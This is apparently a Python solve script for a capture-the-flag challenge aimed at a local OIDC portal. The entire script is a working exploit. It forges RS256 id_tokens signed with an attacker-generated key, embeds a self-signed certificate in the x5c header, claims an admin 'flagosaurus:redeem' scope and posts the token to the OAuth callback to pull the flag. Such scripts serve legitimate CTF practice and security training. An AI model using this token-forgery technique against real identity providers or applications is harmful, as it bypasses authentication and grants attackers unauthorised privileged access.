#!/usr/bin/env python3
# pip install -r requirements.txt
# python3 solve.py
#
import base64, datetime as dt, http.cookiejar, urllib.request, urllib.error
import jwt as pyjwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes, serialization
from cryptography import x509
from cryptography.x509.oid import NameOID

TARGET = "http://localhost:8990"
CLIENT_ID = "trustdinoidc-portal"
ADMIN_SCOPE = "openid profile flagosaurus:redeem"


def forge(iss, scope):
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "attacker")])
    cert = (x509.CertificateBuilder()
            .subject_name(name).issuer_name(name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(dt.datetime.now(dt.timezone.utc))
            .not_valid_after(dt.datetime.now(dt.timezone.utc) + dt.timedelta(days=1))
            .sign(key, hashes.SHA256()))
    der = cert.public_bytes(serialization.Encoding.DER)
    payload = {"iss": iss, "sub": "attacker", "aud": CLIENT_ID, "scope": scope,
               "exp": dt.datetime.now(dt.timezone.utc) + dt.timedelta(hours=1)}
    return pyjwt.encode(payload, key, algorithm="RS256", headers={"x5c": [base64.b64encode(der).decode()]})


def submit(token):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    print(f"PALEO id_token:\n{token}\n")
    req = urllib.request.Request(f"{TARGET}/oauth/callback", data=f"id_token={token}".encode(), method="POST")
    try:
        opener.open(req)
    except urllib.error.HTTPError as e:
        return None, f"{e.code} {e.read().decode()}"
    return opener.open(f"{TARGET}/").read().decode(), None


print("[*] sanity check: forging against paleoid.example.com (expect rejection)")
_, err = submit(forge("paleoid.example.com", ADMIN_SCOPE))
assert err, "expected paleoid.example.com to reject the forgery, but it didn't"
print(f"    rejected as expected: {err}")

print("[*] forging against strataid.example.com")
token = forge("strataid.example.com", ADMIN_SCOPE)
print(f"id_token:\n{token}\n")

body, err = submit(token)
assert not err, f"strataid.example.com rejected the forgery: {err}"
assert "csaw{" in body, "strataid.example.com accepted the token but no flag on the page"

flag = body[body.find("csaw{"):body.find("}", body.find("csaw{")) + 1]
print(f"[+] flag: {flag}")
